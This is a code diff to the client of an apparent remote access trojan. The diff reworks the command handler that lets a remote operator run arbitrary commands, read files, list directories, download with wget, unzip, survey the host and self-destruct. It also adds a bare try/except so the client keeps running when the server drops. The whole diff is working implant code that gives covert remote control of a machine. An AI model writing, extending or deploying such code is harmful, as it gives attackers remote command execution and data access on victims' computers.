@@ -41,12 +41,13 @@ def client_loop(conn, dhkey):
         # seperate data into command and action
         cmd, _, action = data.partition(' ')
 
-        if cmd == 'execute':
-            results = toolkit.execute(action)
-
-        elif cmd == 'kill':
+        if cmd == 'kill':
             conn.close()
             sys.exit(0)
+
+        elif cmd == 'selfdestruct':
+            conn.close()
+            toolkit.selfdestruct(PLAT)
 
         elif cmd == 'goodbye':
             conn.shutdown(socket.SHUT_RDWR)
@@ -65,15 +66,23 @@ def client_loop(conn, dhkey):
         elif cmd == 'survey':
             results = survey.run(PLAT)
 
+        elif cmd == 'cat':
+            results = toolkit.cat(action, PLAT)
+
+        elif cmd == 'execute':
+            results = toolkit.execute(action)
+
+        elif cmd == 'ls':
+            results = toolkit.ls(PLAT)
+
+        elif cmd == 'pwd':
+            results = toolkit.pwd(PLAT)
+
         elif cmd == 'unzip':
             results = toolkit.unzip(action)
 
         elif cmd == 'wget':
             results = toolkit.wget(action)
-
-        elif cmd == 'selfdestruct':
-            conn.close()
-            toolkit.selfdestruct(PLAT)
 
         results += '\n{} completed.'.format(cmd)
 
@@ -93,7 +102,13 @@ def main():
 
         dhkey = crypto.diffiehellman(conn)
 
-        client_loop(conn, dhkey)
+        # This try/except statement makes the client very resilient, but it's
+        # horrible for debugging. It will keep the client alive if the server
+        # is torn down unexpectedly, or if the client freaks out.
+        try:
+            client_loop(conn, dhkey)
+        except:
+            pass
 
 
 if __name__ == '__main__':
